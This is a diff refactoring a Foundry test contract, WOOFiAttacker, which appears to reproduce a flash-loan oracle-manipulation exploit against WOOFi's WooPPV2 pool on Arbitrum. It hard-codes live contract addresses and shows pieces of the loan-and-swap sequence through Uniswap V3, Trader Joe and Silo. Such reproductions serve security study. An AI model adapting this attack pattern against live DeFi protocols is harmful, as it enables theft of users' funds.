@@ -1,21 +1,17 @@
 // SPDX-License-Identifier: GPL-2.0-or-later
-pragma solidity ^0.8.20;
+pragma solidity ^0.8.19;
 
-import {Test, console} from "lib/forge-std/src/Test.sol";
+import {Test, console} from "forge-std/Test.sol";
 
-import {IERC20} from 'lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol';
+import {IERC20} from 'forge-std/interfaces/IERC20.sol';
 
-import './interfaces/ITraderJoe.sol';
-import './interfaces/ISilo.sol';
-import './interfaces/IUniSwapV3Pool.sol';
-import './interfaces/IWooPPV2.sol';
-import './interfaces/IWETH.sol';
-import './interfaces/IWooOracleV2.sol';
+import '../src/interfaces/ITraderJoe.sol';
+import '../src/interfaces/ISilo.sol';
+import '../src/interfaces/IUniSwapV3Pool.sol';
+import '../src/interfaces/IWooPPV2.sol';
+import '../src/interfaces/IWETH.sol';
+import '../src/interfaces/IWooOracleV2.sol';
 
-
-
-/// @title Flash contract implementation
-/// @notice An example contract using the Uniswap V3 flash function
 contract WOOFiAttacker is Test {
     address constant USDC = 0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8;
     address constant WETH = 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1;
@@ -25,7 +21,7 @@ contract WOOFiAttacker is Test {
     IWooPPV2 constant WOOPPV2 = IWooPPV2(0xeFF23B4bE1091b53205E35f3AfCD9C7182bf3062);
     IWooOracleV2 constant WOOORACLEV2 = IWooOracleV2(0x73504eaCB100c7576146618DC306c97454CB3620);
     IUniswapV3Pool constant POOL = IUniswapV3Pool(0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443);
-    uint256 max = type(uint256).max;
+    uint256 constant MAX_UINT = type(uint256).max;
     uint256 uniSwapFlashAmount;
     uint256 traderJoeFlashAmount;
 
@@ -65,10 +61,10 @@ contract WOOFiAttacker is Test {
     /// @notice Calls the pools flash function with data needed in `uniswapV3FlashCallback`
     function initFlash() public {
         // inital approvals required for the tokens 
-        IERC20(WOO).approve(address(WOOPPV2), max);
-        IERC20(WOO).approve(address(SILO), max);
-        IERC20(USDC).approve(address(SILO), max);
-        IERC20(USDC).approve(address(WOOPPV2), max);
+        IERC20(WOO).approve(address(WOOPPV2), MAX_UINT);
+        IERC20(WOO).approve(address(SILO), MAX_UINT);
+        IERC20(USDC).approve(address(SILO), MAX_UINT);
+        IERC20(USDC).approve(address(WOOPPV2), MAX_UINT);
 
         // get the USDC balance of the UniSwap pool
         uniSwapFlashAmount = IERC20(USDC).balanceOf(address(POOL));
@@ -231,8 +227,8 @@ contract WOOFiAttacker is Test {
         console.log("");
 
         // repay WOO loan to Silo & withdraw USDC
-        SILO.repay(WOO, max);
-        SILO.withdraw(USDC, max, true);
+        SILO.repay(WOO, MAX_UINT);
+        SILO.withdraw(USDC, MAX_UINT, true);
         
         // repay the Trader Joe flash loan
         IERC20(WOO).transfer(msg.sender, uint256(amounts) + uint256(totalFees));
